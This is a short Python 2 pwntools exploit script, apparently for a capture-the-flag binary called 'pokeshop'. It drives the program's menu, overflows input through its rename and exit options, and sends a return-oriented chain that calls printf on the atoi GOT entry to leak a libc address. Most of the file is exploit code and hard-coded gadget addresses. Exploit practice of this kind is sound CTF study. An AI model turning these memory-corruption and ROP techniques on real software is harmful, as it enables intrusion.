#!/bin/env python2
from pwn import *

#p = remote('csie.ctf.tw', 10143)
#p = process('./pokeshop')
p = gdb.debug('./pokeshop', 'b *0x400edf')

def menu():
	print p.recvuntil('Your choice:')

s_t = 1
def buy():
	#menu()
	p.sendline('1')
	sleep(s_t)
	menu()
	p.sendline('5')
	sleep(s_t)

def rename(data, name):
	menu()
	print data, len(data)
	p.sendline('3 '+data)
	sleep(s_t)
	p.sendline('0')
	sleep(s_t)
	p.send(name)
	sleep(s_t)
	print p.recvuntil('Done !\n')

def exit(data):
	p.send('4 '+data)
	sleep(s_t)

main_addr = 0x400e3a
pop_rdi = 0x400f53
printf = 0x400d90
atoi_got = 0x602068
nop = 0x4006b1


p.interactive()
buy()
rename('', 'a'*128)
#rename('a'*2+'\x90'*55+p64(pop_rdi)+p64(printf)+p64(main_addr)+p64(atoi_got)*5, 'a'*128)
#exit(cyclic(126, n=8))
exit(p64(nop)*8+p64(pop_rdi)+p64(atoi_got)+p64(printf)+p64(main_addr))
#exit()
p.interactive()
